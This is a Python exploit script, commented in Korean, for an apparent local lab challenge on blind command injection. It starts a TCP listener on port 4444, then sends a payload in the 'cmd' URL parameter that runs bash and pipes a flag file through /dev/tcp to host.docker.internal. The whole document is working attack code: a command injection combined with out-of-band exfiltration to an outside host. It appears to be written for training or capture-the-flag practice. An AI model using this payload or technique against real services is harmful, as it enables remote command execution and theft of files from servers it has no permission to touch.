#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""cmdi-1 (Blind) — 출력이 안 보이는 커맨드 인젝션. OOB(out-of-band)로 flag 유출.
이 스크립트가 직접 TCP 리스너(4444)를 띄우고, cmd 인젝션으로 컨테이너가
host.docker.internal:4444 로 flag 파일을 전송하게 한다. (별도 nc 불필요)

사용:  python cmdi_oob.py            # 기본 http://localhost:9206, 리스너 4444
"""
import socket, threading, urllib.parse, urllib.request, sys, time

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9206").rstrip("/")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
got = {"data": None}

def listener():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT)); s.listen(1); s.settimeout(15)
    try:
        c, _ = s.accept()
        got["data"] = c.recv(4096).decode("utf-8", "replace").strip()
        c.close()
    except socket.timeout:
        pass
    s.close()

def main():
    t = threading.Thread(target=listener, daemon=True); t.start()
    time.sleep(0.5)
    # Blind RCE: 파일을 리스너로 전송 (sh 의 /dev/tcp 미지원 회피 위해 bash 명시)
    cmd = 'bash -c "cat /command_injection_flag.txt > /dev/tcp/host.docker.internal/%d"' % PORT
    url = BASE + "/?cmd=" + urllib.parse.quote(cmd)
    print("[*] trigger:", url)
    try: urllib.request.urlopen(url, timeout=10).read()
    except Exception: pass
    t.join(timeout=16)
    print("[+] flag:", got["data"] or "(수신 실패 — Docker Desktop 의 host.docker.internal 도달 여부 확인)")

if __name__ == "__main__":
    main()
